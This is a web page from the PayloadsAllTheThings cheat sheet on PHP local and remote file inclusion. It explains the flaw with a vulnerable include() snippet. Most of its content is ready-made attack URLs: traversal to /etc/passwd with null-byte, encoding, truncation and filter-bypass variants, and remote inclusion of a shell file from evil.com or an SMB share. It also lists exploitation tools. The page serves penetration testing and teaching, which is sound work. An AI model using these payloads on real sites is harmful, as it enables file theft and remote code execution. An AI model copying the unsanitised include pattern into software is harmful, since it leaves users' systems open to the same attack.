

[Skip to content](#file-inclusion)

Payloads All The Things

File Inclusion

Initializing search

[GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/ "Go to repository")

Payloads All The Things

[GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/ "Go to repository")

* [Payloads All The Things](..)
* [CONTRIBUTING](../CONTRIBUTING/)
* API Key Leaks

  API Key Leaks
  + [API Key and Token Leaks](../API%20Key%20Leaks/)
  + [IIS Machine Keys](../API%20Key%20Leaks/IIS-Machine-Keys/)
* Account Takeover

  Account Takeover
  + [Account Takeover](../Account%20Takeover/)
  + [MFA Bypasses](../Account%20Takeover/mfa-bypass/)
* Business Logic Errors

  Business Logic Errors
  + [Business Logic Errors](../Business%20Logic%20Errors/)
* CORS Misconfiguration

  CORS Misconfiguration
  + [CORS Misconfiguration](../CORS%20Misconfiguration/)
* CRLF Injection

  CRLF Injection
  + [Carriage Return Line Feed](../CRLF%20Injection/)
* CSV Injection

  CSV Injection
  + [CSV Injection](../CSV%20Injection/)
* CVE Exploits

  CVE Exploits
  + [Common Vulnerabilities and Exposures](../CVE%20Exploits/)
  + [CVE-2021-44228 Log4Shell](../CVE%20Exploits/Log4Shell/)
* Clickjacking

  Clickjacking
  + [Clickjacking](../Clickjacking/)
* Client Side Path Traversal

  Client Side Path Traversal
  + [Client Side Path Traversal](../Client%20Side%20Path%20Traversal/)
* Command Injection

  Command Injection
  + [Command Injection](../Command%20Injection/)
* Cross Site Request Forgery

  Cross Site Request Forgery
  + [Cross-Site Request Forgery](../Cross-Site%20Request%20Forgery/)
* DNS Rebinding

  DNS Rebinding
  + [DNS Rebinding](../DNS%20Rebinding/)
* DOM Clobbering

  DOM Clobbering
  + [DOM Clobbering](../DOM%20Clobbering/)
* Denial of Service

  Denial of Service
  + [Denial of Service](../Denial%20of%20Service/)
* Dependency Confusion

  Dependency Confusion
  + [Dependency Confusion](../Dependency%20Confusion/)
* Directory Traversal

  Directory Traversal
  + [Directory Traversal](../Directory%20Traversal/)
* File Inclusion

  File Inclusion
  + File Inclusion

    [File Inclusion](./)

    Table of contents
    - [Summary](#summary)
    - [Tools](#tools)
    - [Local File Inclusion](#local-file-inclusion)
      * [Null Byte](#null-byte)
      * [Double Encoding](#double-encoding)
      * [UTF-8 Encoding](#utf-8-encoding)
      * [Path Truncation](#path-truncation)
      * [Filter Bypass](#filter-bypass)
    - [Remote File Inclusion](#remote-file-inclusion)
      * [Null Byte](#null-byte_1)
      * [Double Encoding](#double-encoding_1)
      * [Bypass allow\_url\_include](#bypass-allow_url_include)
    - [Labs](#labs)
    - [References](#references)
  + [LFI to RCE](LFI-to-RCE/)
  + [Inclusion Using Wrappers](Wrappers/)
* Google Web Toolkit

  Google Web Toolkit
  + [Google Web Toolkit](../Google%20Web%20Toolkit/)
* GraphQL Injection

  GraphQL Injection
  + [GraphQL Injection](../GraphQL%20Injection/)
* HTTP Parameter Pollution

  HTTP Parameter Pollution
  + [HTTP Parameter Pollution](../HTTP%20Parameter%20Pollution/)
* Headless Browser

  Headless Browser
  + [Headless Browser](../Headless%20Browser/)
* Hidden Parameters

  Hidden Parameters
  + [HTTP Hidden Parameters](../Hidden%20Parameters/)
* Insecure Deserialization

  Insecure Deserialization
  + [Insecure Deserialization](../Insecure%20Deserialization/)
  + [.NET Deserialization](../Insecure%20Deserialization/DotNET/)
  + [Java Deserialization](../Insecure%20Deserialization/Java/)
  + [Node Deserialization](../Insecure%20Deserialization/Node/)
  + [PHP Deserialization](../Insecure%20Deserialization/PHP/)
  + [Python Deserialization](../Insecure%20Deserialization/Python/)
  + [Ruby Deserialization](../Insecure%20Deserialization/Ruby/)
* Insecure Direct Object References

  Insecure Direct Object References
  + [Insecure Direct Object References](../Insecure%20Direct%20Object%20References/)
* Insecure Management Interface

  Insecure Management Interface
  + [Insecure Management Interface](../Insecure%20Management%20Interface/)
* Insecure Randomness

  Insecure Randomness
  + [Insecure Randomness](../Insecure%20Randomness/)
* Insecure Source Code Management

  Insecure Source Code Management
  + [Insecure Source Code Management](../Insecure%20Source%20Code%20Management/)
  + [Bazaar](../Insecure%20Source%20Code%20Management/Bazaar/)
  + [Git](../Insecure%20Source%20Code%20Management/Git/)
  + [Mercurial](../Insecure%20Source%20Code%20Management/Mercurial/)
  + [Subversion](../Insecure%20Source%20Code%20Management/Subversion/)
* JSON Web Token

  JSON Web Token
  + [JWT - JSON Web Token](../JSON%20Web%20Token/)
* Java RMI

  Java RMI
  + [Java RMI](../Java%20RMI/)
* LDAP Injection

  LDAP Injection
  + [LDAP Injection](../LDAP%20Injection/)
* LaTeX Injection

  LaTeX Injection
  + [LaTeX Injection](../LaTeX%20Injection/)
* Mass Assignment

  Mass Assignment
  + [Mass Assignment](../Mass%20Assignment/)
* Methodology and Resources

  Methodology and Resources
  + [Active Directory Attacks](../Methodology%20and%20Resources/Active%20Directory%20Attack/)
  + [Bind Shell](../Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/)
  + [Cloud - AWS](../Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/)
  + [Cloud - Azure](../Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/)
  + [Cobalt Strike](../Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/)
  + [Container - Docker](../Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/)
  + [Container - Kubernetes](../Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/)
  + [Application Escape and Breakout](../Methodology%20and%20Resources/Escape%20Breakout/)
  + [HTML Smuggling](../Methodology%20and%20Resources/HTML%20Smuggling/)
  + [Hash Cracking](../Methodology%20and%20Resources/Hash%20Cracking/)
  + [Initial Access](../Methodology%20and%20Resources/Initial%20Access/)
  + [Linux - Evasion](../Methodology%20and%20Resources/Linux%20-%20Evasion/)
  + [Linux - Persistence](../Methodology%20and%20Resources/Linux%20-%20Persistence/)
  + [Linux - Privilege Escalation](../Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/)
  + [MSSQL Server](../Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/)
  + [Metasploit](../Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/)
  + [Bug Hunting Methodology and Enumeration](../Methodology%20and%20Resources/Methodology%20and%20enumeration/)
  + [Network Discovery](../Methodology%20and%20Resources/Network%20Discovery/)
  + [Network Pivoting Techniques](../Methodology%20and%20Resources/Network%20Pivoting%20Techniques/)
  + [Office - Attacks](../Methodology%20and%20Resources/Office%20-%20Attacks/)
  + [Powershell](../Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/)
  + [Reverse Shell Cheat Sheet](../Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
  + [Source Code Management & CI/CD Compromise](../Methodology%20and%20Resources/Source%20Code%20Management/)
  + [Vulnerability Reports](../Methodology%20and%20Resources/Vulnerability%20Reports/)
  + [Subdomains Enumeration](../Methodology%20and%20Resources/Web%20Attack%20Surface/)
  + [Windows - AMSI Bypass](../Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/)
  + [Windows - DPAPI](../Methodology%20and%20Resources/Windows%20-%20DPAPI/)
  + [Windows - Defenses](../Methodology%20and%20Resources/Windows%20-%20Defenses/)
  + [Windows - Download and execute methods](../Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/)
  + [Windows - Mimikatz](../Methodology%20and%20Resources/Windows%20-%20Mimikatz/)
  + [Windows - Persistence](../Methodology%20and%20Resources/Windows%20-%20Persistence/)
  + [Windows - Privilege Escalation](../Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/)
  + [Windows - Using credentials](../Methodology%20and%20Resources/Windows%20-%20Using%20credentials/)
* NoSQL Injection

  NoSQL Injection
  + [NoSQL Injection](../NoSQL%20Injection/)
* OAuth Misconfiguration

  OAuth Misconfiguration
  + [OAuth Misconfiguration](../OAuth%20Misconfiguration/)
* ORM Leak

  ORM Leak
  + [ORM Leak](../ORM%20Leak/)
* Open Redirect

  Open Redirect
  + [Open URL Redirect](../Open%20Redirect/)
* Prompt Injection

  Prompt Injection
  + [Prompt Injection](../Prompt%20Injection/)
* Prototype Pollution

  Prototype Pollution
  + [Prototype Pollution](../Prototype%20Pollution/)
* Race Condition

  Race Condition
  + [Race Condition](../Race%20Condition/)
* Regular Expression

  Regular Expression
  + [Regular Expression](../Regular%20Expression/)
* Request Smuggling

  Request Smuggling
  + [Request Smuggling](../Request%20Smuggling/)
* SAML Injection

  SAML Injection
  + [SAML Injection](../SAML%20Injection/)
* SQL Injection

  SQL Injection
  + [SQL Injection](../SQL%20Injection/)
  + [Google BigQuery SQL Injection](../SQL%20Injection/BigQuery%20Injection/)
  + [Cassandra Injection](../SQL%20Injection/Cassandra%20Injection/)
  + [DB2 Injection](../SQL%20Injection/DB2%20Injection/)
  + [MSSQL Injection](../SQL%20Injection/MSSQL%20Injection/)
  + [MySQL Injection](../SQL%20Injection/MySQL%20Injection/)
  + [Oracle SQL Injection](../SQL%20Injection/OracleSQL%20Injection/)
  + [PostgreSQL Injection](../SQL%20Injection/PostgreSQL%20Injection/)
  + [SQLite Injection](../SQL%20Injection/SQLite%20Injection/)
  + [SQLmap](../SQL%20Injection/SQLmap/)
* Server Side Include Injection

  Server Side Include Injection
  + [Server Side Include Injection](../Server%20Side%20Include%20Injection/)
* Server Side Request Forgery

  Server Side Request Forgery
  + [Server-Side Request Forgery](../Server%20Side%20Request%20Forgery/)
  + [SSRF Advanced Exploitation](../Server%20Side%20Request%20Forgery/SSRF-Advanced-Exploitation/)
  + [SSRF URL for Cloud Instances](../Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances/)
* Server Side Template Injection

  Server Side Template Injection
  + [Server Side Template Injection](../Server%20Side%20Template%20Injection/)
  + [Server Side Template Injection - ASP.NET](../Server%20Side%20Template%20Injection/ASP/)
  + [Server Side Template Injection - Java](../Server%20Side%20Template%20Injection/Java/)
  + [Server Side Template Injection - JavaScript](../Server%20Side%20Template%20Injection/JavaScript/)
  + [Server Side Template Injection - PHP](../Server%20Side%20Template%20Injection/PHP/)
  + [Server Side Template Injection - Python](../Server%20Side%20Template%20Injection/Python/)
  + [Server Side Template Injection - Ruby](../Server%20Side%20Template%20Injection/Ruby/)
* Tabnabbing

  Tabnabbing
  + [Tabnabbing](../Tabnabbing/)
* Type Juggling

  Type Juggling
  + [Type Juggling](../Type%20Juggling/)
* Upload Insecure Files

  Upload Insecure Files
  + [Upload Insecure Files](../Upload%20Insecure%20Files/)
  + Configuration Apache .htaccess

    Configuration Apache .htaccess
    - [.htaccess](../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/)
* Web Cache Deception

  Web Cache Deception
  + [Web Cache Deception](../Web%20Cache%20Deception/)
* Web Sockets

  Web Sockets
  + [Web Sockets](../Web%20Sockets/)
* XPATH Injection

  XPATH Injection
  + [XPATH Injection](../XPATH%20Injection/)
* XSLT Injection

  XSLT Injection
  + [XSLT Injection](../XSLT%20Injection/)
* XSS Injection

  XSS Injection
  + [Cross Site Scripting](../XSS%20Injection/)
  + [XSS Filter Bypass](../XSS%20Injection/1%20-%20XSS%20Filter%20Bypass/)
  + [Polyglot XSS](../XSS%20Injection/2%20-%20XSS%20Polyglot/)
  + [Common WAF Bypass](../XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass/)
  + [CSP Bypass](../XSS%20Injection/4%20-%20CSP%20Bypass/)
  + [XSS in Angular and AngularJS](../XSS%20Injection/5%20-%20XSS%20in%20Angular/)
* XXE Injection

  XXE Injection
  + [XML External Entity](../XXE%20Injection/)
* Zip Slip

  Zip Slip
  + [Zip Slip](../Zip%20Slip/)
* LEARNING AND SOCIALS

  LEARNING AND SOCIALS
  + [Books](../_LEARNING_AND_SOCIALS/BOOKS/)
  + [Twitter](../_LEARNING_AND_SOCIALS/TWITTER/)
  + [Youtube](../_LEARNING_AND_SOCIALS/YOUTUBE/)
* template vuln

  template vuln
  + [Vulnerability Title](../_template_vuln/)

Table of contents

* [Summary](#summary)
* [Tools](#tools)
* [Local File Inclusion](#local-file-inclusion)
  + [Null Byte](#null-byte)
  + [Double Encoding](#double-encoding)
  + [UTF-8 Encoding](#utf-8-encoding)
  + [Path Truncation](#path-truncation)
  + [Filter Bypass](#filter-bypass)
* [Remote File Inclusion](#remote-file-inclusion)
  + [Null Byte](#null-byte_1)
  + [Double Encoding](#double-encoding_1)
  + [Bypass allow\_url\_include](#bypass-allow_url_include)
* [Labs](#labs)
* [References](#references)

# File Inclusion

> A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.

## Summary

* [Tools](#tools)
* [Local File Inclusion](#local-file-inclusion)
  + [Null Byte](#null-byte)
  + [Double Encoding](#double-encoding)
  + [UTF-8 Encoding](#utf-8-encoding)
  + [Path Truncation](#path-truncation)
  + [Filter Bypass](#filter-bypass)
* [Remote File Inclusion](#remote-file-inclusion)
  + [Null Byte](#null-byte-1)
  + [Double Encoding](#double-encoding-1)
  + [Bypass allow\_url\_include](#bypass-allow_url_include)
* [Labs](#labs)
* [References](#references)

## Tools

* [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
* [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner
* [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
* [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
* [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool

## Local File Inclusion

**File Inclusion Vulnerability** should be differentiated from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.

Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.

```
<?php
$file = $_GET['page'];
include($file);
?>

```

In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.

```
http://example.com/index.php?page=../../../etc/passwd

```
### Null Byte

![⚠](https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/26a0.svg ":warning:") In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).

```
http://example.com/index.php?page=../../../etc/passwd%00

```

**Example**: Joomla! Component Web TV 1.0 - CVE-2010-1470

```
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00

```
### Double Encoding

```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00

```
### UTF-8 Encoding

```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00

```
### Path Truncation

On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.

```
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd

```
### Filter Bypass

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

```
## Remote File Inclusion

> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.

Remote File Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP 5.

```
allow_url_include = On

```

Most of the filter bypasses from LFI section can be reused for RFI.

```
http://example.com/index.php?page=http://evil.com/shell.txt

```
### Null Byte

```
http://example.com/index.php?page=http://evil.com/shell.txt%00

```
### Double Encoding

```
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt

```
### Bypass allow\_url\_include

When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.

1. Create a share open to everyone
2. Write a PHP code inside a file : `shell.php`
3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`

## Labs

* [Root Me - Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
* [Root Me - Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
* [Root Me - Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
* [Root Me - PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)

## References

* [CVV #1: Local File Inclusion - SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
* [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux - 2019-05-12](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
* [Is PHP vulnerable and under what conditions? - April 13, 2015 - Andreas Venieris](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
* [LFI Cheat Sheet - @Arr0way - 24 Apr 2016](https://highon.coffee/blog/lfi-cheat-sheet/)
* [Testing for Local File Inclusion - OWASP - 25 June 2017](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
* [Turning LFI into RFI - Grayson Christopher - 2017-08-14](https://web.archive.org/web/20170815004721/https%3A//l.avala.mp/?p=241)

November 29, 2024

**Share this content**

Back to top

Made with
[Material for MkDocs](https://squidfunk.github.io/mkdocs-material/)

